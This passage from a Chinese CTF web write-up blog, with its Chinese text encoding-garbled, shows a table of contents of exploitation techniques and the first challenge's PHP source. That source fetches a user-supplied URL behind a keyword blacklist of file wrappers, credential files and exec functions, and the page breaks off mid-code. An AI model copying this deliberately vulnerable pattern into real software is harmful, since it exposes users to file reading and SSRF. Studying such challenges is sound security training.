<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="å‰è¨€ ?ctfçš„week1è¿‡äºç®€å•ï¼Œæ‰€ä»¥ä»week2å¼€å§‹å†™èµ·ï¼ŒæŸ¥æ¼è¡¥ç¼ºã€‚ Week2 Look at the picture çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€php:filterä¼ªåè®®å­—ç¬¦ç¼–ç ç»•è¿‡ ww">
<title>qctf2025</title>

<link rel='canonical' href='http://localhost:1313/p/qctf2025/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="qctf2025">
<meta property='og:description' content="å‰è¨€ ?ctfçš„week1è¿‡äºç®€å•ï¼Œæ‰€ä»¥ä»week2å¼€å§‹å†™èµ·ï¼ŒæŸ¥æ¼è¡¥ç¼ºã€‚ Week2 Look at the picture çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€php:filterä¼ªåè®®å­—ç¬¦ç¼–ç ç»•è¿‡ ww">
<meta property='og:url' content='http://localhost:1313/p/qctf2025/'>
<meta property='og:site_name' content='liernian'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-11-07T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-11-07T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="qctf2025">
<meta name="twitter:description" content="å‰è¨€ ?ctfçš„week1è¿‡äºç®€å•ï¼Œæ‰€ä»¥ä»week2å¼€å§‹å†™èµ·ï¼ŒæŸ¥æ¼è¡¥ç¼ºã€‚ Week2 Look at the picture çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€php:filterä¼ªåè®®å­—ç¬¦ç¼–ç ç»•è¿‡ ww">
    <link rel="shortcut icon" href="/favicon.ico" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ’¯</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">liernian</a></h1>
            <h2 class="site-description">ç†æƒ³ä¸»ä¹‰çš„ä¸­äºŒå°‘å¹´</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="http://localhost:1313/en/" >English</option>
                                
                                    <option value="http://localhost:1313/" selected>ç®€ä½“ä¸­æ–‡</option>
                                
                                    <option value="http://localhost:1313/ar/" >Ø¹Ø±Ø¨ÙŠ</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>æš—è‰²æ¨¡å¼</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">ç›®å½•</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#å‰è¨€">å‰è¨€</a></li>
    <li><a href="#week2">Week2</a>
      <ol>
        <li><a href="#look-at-the-picture">Look at the picture</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹æ–‡ä»¶åŒ…å«phpfilterä¼ªåè®®å­—ç¬¦ç¼–ç ç»•è¿‡">çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€php:filterä¼ªåè®®å­—ç¬¦ç¼–ç ç»•è¿‡</a></li>
          </ol>
        </li>
        <li><a href="#only-picture-up">Only Picture Up</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹æ–‡ä»¶ä¸Šä¼ ">çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ </a></li>
          </ol>
        </li>
        <li><a href="#ç•™è¨€æ¿">ç•™è¨€æ¿</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹è¿‡æ»¤ssti-request">çŸ¥è¯†ç‚¹ï¼šè¿‡æ»¤ssti request</a></li>
          </ol>
        </li>
        <li><a href="#ç™»å½•å’ŒæŸ¥è¯¢">ç™»å½•å’ŒæŸ¥è¯¢</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹çˆ†ç ´å’Œå¥‡å¥‡æ€ªæ€ªçš„sql">çŸ¥è¯†ç‚¹ï¼šçˆ†ç ´å’Œå¥‡å¥‡æ€ªæ€ªçš„sql</a></li>
          </ol>
        </li>
        <li><a href="#è¿™æ˜¯ä»€ä¹ˆå‡½æ•°">è¿™æ˜¯ä»€ä¹ˆå‡½æ•°?</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹åŸå‹é“¾æ±¡æŸ“">çŸ¥è¯†ç‚¹ï¼šåŸå‹é“¾æ±¡æŸ“</a></li>
          </ol>
        </li>
        <li><a href="#regular-expression">Regular Expression</a></li>
      </ol>
    </li>
    <li><a href="#week3">Week3</a>
      <ol>
        <li><a href="#vip">VIP</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹goè¯­è¨€sstigo-build-ç¯å¢ƒå˜é‡æ³¨å…¥">çŸ¥è¯†ç‚¹ï¼šgoè¯­è¨€sstiã€Go build ç¯å¢ƒå˜é‡æ³¨å…¥</a></li>
          </ol>
        </li>
        <li><a href="#ez_php">ez_php</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹éæ³•å˜é‡åä¼ å‚æ— å­—æ¯æ•°å­—--å››å­—ç¬¦rce">çŸ¥è¯†ç‚¹ï¼šéæ³•å˜é‡åä¼ å‚ã€æ— å­—æ¯æ•°å­— + å››å­—ç¬¦rce</a></li>
          </ol>
        </li>
        <li><a href="#mysqlç®¡ç†å·¥å…·">mysqlç®¡ç†å·¥å…·</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹jwtçˆ†ç ´mysqlä»»æ„æ–‡ä»¶è¯»å–yamlååºåˆ—åŒ–">çŸ¥è¯†ç‚¹ï¼šJWTçˆ†ç ´ã€Mysqlä»»æ„æ–‡ä»¶è¯»å–ã€yamlååºåˆ—åŒ–</a></li>
          </ol>
        </li>
        <li><a href="#è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°">è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°ï¼Ÿ</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹pythonå†…å­˜é©¬--ç›²æ³¨">çŸ¥è¯†ç‚¹ï¼špythonå†…å­˜é©¬ || ç›²æ³¨</a></li>
          </ol>
        </li>
        <li><a href="#æŸ¥æŸ¥å¿†">æŸ¥æŸ¥å¿†</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹å¤–éƒ¨æ³¨å…¥dtdwaf-xxe">çŸ¥è¯†ç‚¹ï¼šå¤–éƒ¨æ³¨å…¥dtd+waf XXE</a></li>
          </ol>
        </li>
        <li><a href="#é­”æœ¯å¤§æ‚çƒ©">é­”æœ¯å¤§æ‚çƒ©</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹phpååºåˆ—åŒ–">çŸ¥è¯†ç‚¹ï¼šphpååºåˆ—åŒ–</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#week4">Week4</a>
      <ol>
        <li><a href="#path-to-hero">Path to Hero</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹phpååºåˆ—åŒ–md5rce">çŸ¥è¯†ç‚¹ï¼šphpååºåˆ—åŒ–ã€md5ã€rce</a></li>
          </ol>
        </li>
        <li><a href="#android-or-apple">android or apple</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹ä»£ç å®¡è®¡ssrfæ‰“sqlæ³¨å…¥">çŸ¥è¯†ç‚¹ï¼šä»£ç å®¡è®¡ã€ssrfæ‰“sqlæ³¨å…¥</a></li>
          </ol>
        </li>
        <li><a href="#wafwaf">waf?waf!</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹httpè¯·æ±‚èµ°ç§">çŸ¥è¯†ç‚¹ï¼šhttpè¯·æ±‚èµ°ç§</a></li>
          </ol>
        </li>
        <li><a href="#å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»">å¥½åƒä»€ä¹ˆéƒ½èƒ½è¯»</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹flask-pinç è®¡ç®—">çŸ¥è¯†ç‚¹ï¼šflask pinç è®¡ç®—</a></li>
          </ol>
        </li>
        <li><a href="#æ¥getshell-é€Ÿåº¦">æ¥getshell é€Ÿåº¦ï¼</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹includeè§£ææ¶æ„pharsudoææƒæ±‡æ€»">çŸ¥è¯†ç‚¹ï¼šincludeè§£ææ¶æ„pharï¼Œsudoææƒæ±‡æ€»</a></li>
          </ol>
        </li>
        <li><a href="#è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°">è¿™åˆåˆæ˜¯ä»€ä¹ˆå‡½æ•°</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹pickleå†…å­˜é©¬">çŸ¥è¯†ç‚¹ï¼špickleå†…å­˜é©¬</a></li>
          </ol>
        </li>
        <li><a href="#ez_ref">ez_Ref</a>
          <ol>
            <li><a href="#çŸ¥è¯†ç‚¹javaååºåˆ—åŒ–fastjsonç»•è¿‡resolveclass">çŸ¥è¯†ç‚¹ï¼šjavaååºåˆ—åŒ–ã€FastJsonç»•è¿‡resolveclass</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/wp/" >
                Wp
            </a>
        
            <a href="/categories/web/" >
                Web
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/qctf2025/">qctf2025</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2025-11-07</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    é˜…è¯»æ—¶é•¿: 29 åˆ†é’Ÿ
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="å‰è¨€">å‰è¨€
</h2><p>?ctfçš„week1è¿‡äºç®€å•ï¼Œæ‰€ä»¥ä»week2å¼€å§‹å†™èµ·ï¼ŒæŸ¥æ¼è¡¥ç¼ºã€‚</p>
<h2 id="week2">Week2
</h2><h3 id="look-at-the-picture">Look at the picture
</h3><h4 id="çŸ¥è¯†ç‚¹æ–‡ä»¶åŒ…å«phpfilterä¼ªåè®®å­—ç¬¦ç¼–ç ç»•è¿‡">çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€php:filterä¼ªåè®®å­—ç¬¦ç¼–ç ç»•è¿‡
</h4><p>www.zipè·å–æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="c1">// éšæœºå›¾ç‰‡URLæ•°ç»„
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$randomImages</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=3&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=4&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=5&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=6&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=7&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=8&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=9&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;https://picsum.photos/500/500?random=10&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// è·å–URLå‚æ•°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$imageUrl</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$blacklist_keywords</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;file://&#39;</span><span class="p">,</span> <span class="s1">&#39;file%3A//&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;phar://&#39;</span><span class="p">,</span> <span class="s1">&#39;phar%3A//&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;zip://&#39;</span><span class="p">,</span> <span class="s1">&#39;zip%3A//&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;data:&#39;</span><span class="p">,</span> <span class="s1">&#39;data%3A&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;glob://&#39;</span><span class="p">,</span> <span class="s1">&#39;glob%3A//&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;expect://&#39;</span><span class="p">,</span> <span class="s1">&#39;expect%3A//&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;ftp://&#39;</span><span class="p">,</span> <span class="s1">&#39;ftps://&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;passwd&#39;</span><span class="p">,</span> <span class="s1">&#39;shadow&#39;</span><span class="p">,</span> <span class="s1">&#39;etc/&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;bin&#39;</span><span class="p">,</span> <span class="s1">&#39;bash&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;base64&#39;</span><span class="p">,</span>  <span class="s1">&#39;string.&#39;</span><span class="p">,</span>  <span class="s1">&#39;rot13&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;shell_exec&#39;</span><span class="p">,</span> <span class="s1">&#39;popen&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist_keywords</span> <span class="k">as</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$imageUrl</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;I see you.....&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// å¦‚æœæ²¡æœ‰URLå‚æ•°ï¼Œé€‰æ‹©ä¸€ä¸ªéšæœºå›¾ç‰‡å¹¶é‡å®šå‘
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$imageUrl</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$randomImage</span> <span class="o">=</span> <span class="nv">$randomImages</span><span class="p">[</span><span class="nx">array_rand</span><span class="p">(</span><span class="nv">$randomImages</span><span class="p">)];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ?url=&#34;</span> <span class="o">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$randomImage</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// åˆå§‹åŒ–å˜é‡
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$base64Image</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$imageInfo</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$imageUrl</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// éªŒè¯URLæ ¼å¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">filter_var</span><span class="p">(</span><span class="nv">$imageUrl</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_URL</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// ä½¿ç”¨file_get_contentsè·å–å›¾ç‰‡å†…å®¹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$imageContent</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$imageUrl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$imageContent</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// è·å–å›¾ç‰‡ä¿¡æ¯
